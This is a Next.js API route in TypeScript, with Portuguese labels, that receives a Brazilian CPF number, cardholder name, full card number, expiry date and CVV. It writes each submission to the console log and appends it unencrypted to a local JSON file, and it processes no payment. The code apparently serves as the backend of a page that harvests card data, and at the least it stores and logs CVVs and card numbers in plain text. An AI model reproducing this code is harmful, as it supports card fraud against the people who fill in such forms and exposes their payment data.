import { NextRequest, NextResponse } from 'next/server'
import fs from 'fs/promises'
import path from 'path'

interface FormData {
  document: string;
  cardName: string;
  cardNumber: string;
  cardExpiry: string;
  cardCVV: string;
  paymentMethod: 'credit' | 'debit';
}

const DATA_FILE_PATH = path.join(process.cwd(), 'data', 'form-data.json');

export async function POST(request: NextRequest) {
  try {
    const data: FormData = await request.json()
    console.log('Received form data:', data);

    const formattedData = {
      'CPF': data.document,
      'Nome no Cartão': data.cardName,
      'Número do Cartão': data.cardNumber,
      'Validade': data.cardExpiry,
      'CVV': data.cardCVV,
      'Método de Pagamento': data.paymentMethod === 'credit' ? 'Crédito' : 'Débito',
      'Data de Submissão': new Date().toISOString()
    }

    console.log('Formatted data to be saved:', formattedData);

    // Ensure the data directory exists
    await fs.mkdir(path.dirname(DATA_FILE_PATH), { recursive: true });

    // Read existing data
    let existingData = [];
    try {
      const fileContent = await fs.readFile(DATA_FILE_PATH, 'utf-8');
      existingData = JSON.parse(fileContent);
    } catch (error) {
      console.log('No existing data file found. Creating a new one.');
    }

    // Append new data
    existingData.push(formattedData);

    // Write updated data back to file
    await fs.writeFile(DATA_FILE_PATH, JSON.stringify(existingData, null, 2));

    console.log('Data saved successfully');
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error('Error processing form submission:', error);
    return NextResponse.json({ success: false, error: 'Failed to save data' }, { status: 500 })
  }
}

